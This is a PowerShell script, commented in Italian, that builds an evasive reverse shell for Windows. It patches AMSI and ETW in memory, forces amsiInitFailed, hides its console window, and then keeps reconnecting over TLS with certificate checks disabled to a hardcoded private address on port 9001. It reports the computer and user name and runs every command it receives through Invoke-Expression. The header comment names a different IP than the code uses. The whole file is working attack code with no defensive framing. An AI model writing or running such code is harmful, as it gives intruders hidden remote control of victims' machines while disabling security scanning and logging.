# ============================================================
#  Reverse shell evasiva - target Windows -> 192.168.1.102:9001
# ============================================================

# ---------- Helper Win32 (compila solo se non gia' caricato) ----------
if (-not ('W' -as [type])) {
  $code = @'
using System;
using System.Runtime.InteropServices;
public class W {
  [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
  [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
  [DllImport("kernel32")] public static extern IntPtr VirtualProtect(IntPtr a, UIntPtr s, uint f, out uint o);
  [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string n);
}
'@
  Add-Type -TypeDefinition $code -Language CSharp
}

function Patch([string]$lib, [string]$func, [byte[]]$bytes) {
  $h = [W]::GetModuleHandle($lib)
  if ($h -eq [IntPtr]::Zero) { $h = [W]::LoadLibrary($lib) }
  $a = [W]::GetProcAddress($h, $func)
  $old = [uint32]0
  [void][W]::VirtualProtect($a, [UIntPtr][uint64]$bytes.Length, 0x40, [ref]$old)
  [System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $a, $bytes.Length)
  [void][W]::VirtualProtect($a, [UIntPtr][uint64]$bytes.Length, $old, [ref]$old)
}

# ---------- 1) Patch AMSI ----------
Patch 'amsi.dll' 'AmsiScanBuffer' ([byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3))

# ---------- 2) Patch ETW ----------
Patch 'ntdll.dll' 'EtwEventWrite' ([byte[]](0x31,0xC0,0xC3))

# ---------- 3) Nascondi console ----------
if (-not ('X.U' -as [type])) {
  $sig = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int c);' +
         '[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();'
  Add-Type -MemberDefinition $sig -Name U -Namespace X
}
[void][X.U]::ShowWindow([X.U]::GetConsoleWindow(), 0)

# ---------- 4) amsiInitFailed = true ----------
try {
  $ps  = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
  $fld = $ps.GetField('amsiInitFailed', 'NonPublic,Static')
  if ($fld) { $fld.SetValue($null, $true) }
} catch { }

# ---------- 5) Reverse shell TLS ----------
$L = '192.168.1.139'
$P = 9001

$dx = { param($s, $k) ($s.ToCharArray() | ForEach-Object { [char]([int]$_ -bxor $k) }) -join '' }

$c   = $null
$ssl = $null

while ($true) {
  try {
    $c = New-Object Net.Sockets.TCPClient
    $ar = $c.BeginConnect($L, $P, $null, $null)
    $ok = $ar.AsyncWaitHandle.WaitOne(4000)
    if (-not $ok) { $c.Close(); $c = $null; Start-Sleep (Get-Random -Min 20 -Max 60); continue }
    $c.EndConnect($ar)
    $t = $c.GetStream()

    $cb  = [Net.Security.RemoteCertificateValidationCallback]{ $true }
    $ssl = New-Object Net.Security.SslStream($t, $false, $cb)
    $ssl.AuthenticateAsClient($L)

    $r = New-Object IO.StreamReader($ssl)
    $w = New-Object IO.StreamWriter($ssl)
    $w.AutoFlush = $true

    $w.WriteLine('conn: ' + $env:COMPUTERNAME + '/' + $env:USERNAME)

    $run = $true
    while ($run -and $c.Connected) {
      # prompt con NewLine esplicito: evita buffering parziale
      $w.Write('PS ' + (Get-Location).Path + '> ')
      $cmd = $r.ReadLine()
      if ($null -eq $cmd) { break }               # stream chiuso dal listener
      if ([string]::IsNullOrEmpty($cmd)) { continue }
      if ((& $dx $cmd 0x11) -eq 'exit') { $run = $false; break }
      try   { $o = (Invoke-Expression $cmd 2>&1 | Out-String) }
      catch { $o = 'ERR: ' + $_.Exception.Message }
      if ($null -eq $o) { $o = '' }
      if ($o.Length -gt 60000) { $o = $o.Substring(0, 60000) }
      $w.WriteLine($o)
    }
  }
  catch { }
  finally {
    # chiusura pulita a ogni iterazione, con o senza errore
    try { if ($ssl) { $ssl.Shutdown() } } catch { }
    try { if ($ssl) { $ssl.Dispose() } } catch { }
    $ssl = $null
    if ($c) { try { $c.Close() } catch { }; $c = $null }
  }
  Start-Sleep (Get-Random -Min 15 -Max 45)
}
